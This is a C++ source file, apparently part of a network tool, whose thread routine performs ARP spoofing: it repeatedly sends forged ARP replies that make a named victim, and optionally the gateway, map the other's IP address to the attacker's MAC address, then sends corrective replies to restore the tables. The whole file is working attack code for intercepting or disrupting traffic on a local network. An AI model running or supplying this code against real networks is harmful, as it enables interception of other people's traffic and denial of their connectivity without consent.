//
// Created by kenny on 2/1/19.
//
#include "arpspf.h"
#include "pth-args.h"

using namespace kni;

void *routine_start_spoof(void *ptr) {
    auto args = (pthargs_spoof *) ptr;
    auto netdb = args->netdb;

    std::unique_ptr<char[]> errbuf(new char[PCAP_ERRBUF_SIZE]);
    std::unique_ptr<u_char[]> sndbuf(new u_char[ETHER_HDRLEN + ARP_HDRLEN]);

    arp_io_packet arp_io(errbuf.get(), PCAP_ERRBUF_SIZE);
    arp_io.prepare(sndbuf.get());

    if (!arp_io.open(netdb->devname)) {
        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.error());
        return nullptr;
    } else {
        KNI_LOG_DEBUG("device \"%s\" opened successfully.", netdb->devname.c_str());;
    }

    KNI_LOG_DEBUG("ip=%s secs=%d pkts=%d twoway=%d", args->victim_ip.c_str(), args->seconds, args->npackets,
                  args->twoway);
    KNI_PRINTLN("Spoofing %s(%s)...", to_string(args->victim_mac).c_str(), args->victim_ip.c_str());

    int count = 0;
    while (args->to_be_running) {
        auto succ = arp_io.reply(netdb->gateway_ip, netdb->devinfo.hw_addr, args->victim_ip, args->victim_mac);
        if (succ && args->twoway)
            succ = arp_io.reply(args->victim_ip, netdb->devinfo.hw_addr, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        // If args->npackets < 0 then it becomes an infinite loop
        if (++count == args->npackets)
            break;
        else
            sleep(static_cast<unsigned int>(args->seconds));
    }

    KNI_LOG_DEBUG("restoring ARP...");

    for (auto i = 0; i < 5; ++i) {
        bool succ = arp_io.reply(netdb->gateway_ip, netdb->gateway_mac, args->victim_ip, args->victim_mac);
        if (succ && args->twoway)
            succ = arp_io.reply(args->victim_ip, args->victim_mac, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        if (i != args->npackets - 1)
            sleep(3);
    }

    arp_io.close();
    KNI_LOG_DEBUG("device \"%s\" closed", netdb->devname.c_str());

    return nullptr;
}